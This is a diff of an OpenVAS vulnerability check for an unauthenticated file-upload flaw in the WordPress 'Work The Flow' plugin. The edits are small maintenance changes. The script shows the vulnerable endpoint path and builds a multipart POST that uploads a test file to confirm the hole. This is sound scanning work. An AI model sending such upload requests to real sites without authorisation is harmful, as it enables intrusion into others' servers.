@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_work_the_flow_file_upload_vuln.nasl 11259 2018-09-06 08:28:49Z mmartin $
+# $Id: gb_wordpress_work_the_flow_file_upload_vuln.nasl 11321 2018-09-11 10:05:53Z cfischer $
 #
 # Wordpress Work The Flow Plugin File Upload Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805602");
-  script_version("$Revision: 11259 $");
+  script_version("$Revision: 11321 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-06 10:28:49 +0200 (Thu, 06 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:05:53 +0200 (Tue, 11 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-04-27 15:42:27 +0530 (Mon, 27 Apr 2015)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Wordpress Work The Flow Plugin File Upload Vulnerability");
@@ -78,7 +78,6 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
@@ -87,11 +86,11 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-##Attack url
 url = dir + "/wp-content/plugins/work-the-flow-file-upload/public/"
           + "assets/jQuery-File-Upload-9.5.0/server/php/index.php";
 
-##Generate random filename
+host = http_host_name(port:http_port);
+
 fileName = 'openvas_test' + rand();
 
 postData = string('------------------------------7d426ec7fdf67986\r\n',
@@ -104,7 +103,7 @@ postData = string('------------------------------7d426ec7fdf67986\r\n',
                   '------------------------------7d426ec7fdf67986--');
 
 req = string("POST ", url, " HTTP/1.1\r\n",
-             "Host: ", get_host_name(), "\r\n",
+             "Host: ", host, "\r\n",
              "Content-Length: ", strlen(postData), "\r\n",
              "Content-Type: multipart/form-data; boundary=----------------------------7d426ec7fdf67986\r\n",
              "\r\n", postData);
